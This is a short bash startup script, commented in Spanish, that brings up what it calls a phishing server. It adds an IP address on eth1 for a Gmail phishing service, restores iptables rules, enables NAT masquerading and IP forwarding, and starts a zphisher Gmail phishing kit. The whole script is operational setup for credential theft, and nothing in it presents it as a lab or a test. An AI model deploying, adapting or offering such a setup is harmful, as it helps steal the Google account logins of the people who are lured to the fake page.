#!/bin/bash

# Scripts de arranque del servidor de Phishing
##### Añadir las Ips para cada servicio de Phishing ####
## 172.16.17.165 eth1 por DHCP para gmail ##
'ip' a add 172.16.17.165/25 dev eth1

## Se restablecen las reglas de iptables ####
iptables-restore < /etc/default/iptables
iptables -t nat -A POSTROUTING -j MASQUERADE

# Reenvio
echo 1 > /proc/sys/net/ipv4/ip_forward

## Inicamos los servicios de Phishing

bash zphisher_gmail/zphisher.gmail.sh start 

exit
